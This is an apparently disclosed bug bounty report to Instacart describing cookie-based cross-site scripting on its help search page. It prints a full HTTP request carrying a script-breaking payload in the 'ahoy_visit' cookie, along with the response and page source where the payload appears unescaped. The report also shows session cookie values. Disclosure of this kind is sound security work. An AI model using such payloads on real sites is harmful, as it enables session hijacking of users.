# Cookie-Based Injection

## Report Details
- **Report ID**: 105419
- **URL**: https://hackerone.com/reports/105419
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2015-12-15T16:38:43.644Z
- **Disclosed**: 2016-09-26T20:12:59.846Z

## Reporter
- **Username**: hussain_0x3c
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: instacart

## Vulnerability Information
**Hi** Security Team instacart

I'm Found Vulnerability **Cookie-Based Injection** It's may be possible to steal or manipulate session and cookies if attacker can injection **XSS** .  

details
---
in path **/help/** contain header in cookie  paramter **ahoy_visitor** and  **ahoy_visit** it's allow injection because re request allow **Content-Type: text/html**  without filtering 

**request** 
~~~
GET /help/search?utf8=%E2%9C%93&q=1234 HTTP/1.1
Cookie: ahoy_visitor=bea4a4cc-01ca-4076-b156-1d11356afe0a; ahoy_track=true; ic_uniq_id=BAhJIhIxNDQ5OTg5Mjk5ODc4BjoGRUY%3D--e26e9e540d5cb31efed655eef8adf6e07768f6a3; visit_id=BAhpBC6ZzAg%3D--9db70ee03573d7c977ac56adf67713f21c8cc599; _session_id=c726cf2c4764c58c8e9c47da08806373; build_sha=cbe364874847ad610e8e208ebdfcd044107728d7; ahoy_visit=c5ff00ff-8242-4a44-92a2-8d178e20c17f</script ><script>alert(8)</script>
Accept-Language: en-US
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: https://www.instacart.com/help
Host: www.instacart.com
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Tablet PC 2.0)
~~~
**response**
~~~
HTTP/1.1 200 OK
Cache-Control: max-age=0, private, must-revalidate
Content-Type: text/html; charset=utf-8
Date: Sun, 13 Dec 2015 07:29:01 GMT
ETag: W/"91886df9422f684d07ccc7e7b0e5e7ed"
Server: nginx
Status: 200 OK
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Vary: Accept-Encoding
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
X-Jobs: jobs@instacart.com
X-Request-Id: 4e80ccc3-36de-4a6b-8731-21fc5d7d6155
X-Runtime: 0.048853
X-XSS-Protection: 1; mode=block
Content-Length: 20663
Connection: keep-alive
Set-Cookie: build_sha=cbe364874847ad610e8e208ebdfcd044107728d7;Path=/;
Set-Cookie: ahoy_visit=a97bdcba-cbe2-56b2-89fc-efe87957b138; path=/; expires=Sun, 13 Dec 2015 11:29:01 -0000
 

Source Page 

!function(){var analytics=window.analytics=window.analytics||[];if(!analytics.initialize)if(analytics.invoked)window.console&&console.error&&console.error("Segment snippet included twice.");else{analytics.invoked=!0;analytics.methods=["trackSubmit","trackClick","trackLink","trackForm","pageview","identify","group","track","ready","alias","page","once","off","on"];analytics.factory=function(t){return function(){var e=Array.prototype.slice.call(arguments);e.unshift(t);analytics.push(e);return analytics}};for(var t=0;t<analytics.methods.length;t++){var e=analytics.methods[t];analytics[e]=analytics.factory(e)}analytics.load=function(t){var e=document.createElement("script");e.type="text/javascript";e.async=!0;e.src=("https:"===document.location.protocol?"https://":"http://")+"cdn.segment.com/analytics.js/v1/"+t+"/analytics.min.js";var n=document.getElementsByTagName("script")[0];n.parentNode.insertBefore(e,n)};analytics.SNIPPET_VERSION="3.0.1";
  analytics.load("9uIMc3rUXySY5rCFhBfRHc6zKHFNrkFv");
var pageViewProps = {"referrer_domain":"https://www.instacart.com/help","ahoy_visitor_token":"bea4a4cc-01ca-4076-b156-1d11356afe0a","ahoy_visit_token":"c5ff00ff-8242-4a44-92a2-8d178e20c17f</script ><script>alert(8)</script>"};
window['pageViewProps'] = pageViewProps;
window['user_channel_props'] = {};
window['utm_params'] = {}
pageViewProps.name = window.location.pathname;
pageViewProps.login_state = "loggedout";
analytics.page(pageViewProps);
 analytics.identify({"referrer_domain":"https://www.instacart.com/help","science__growth_late_reg_web":"control","platform":"web","ahoy_visitor_token":"bea4a4cc-01ca-4076-b156-1d11356afe0a","ahoy_visit_token":"c5ff00ff-8242-4a44-92a2-8d178e20c17f</script ><script>alert(8)</script>"});
~~~

**Test** :- FF - IE



**POC IMG  :-** http://i.imgur.com/MutfPsL.jpg **&** http://i.imgur.com/kCikyEq.jpg

**Regards**
@Hussain

## Attachments
No attachments
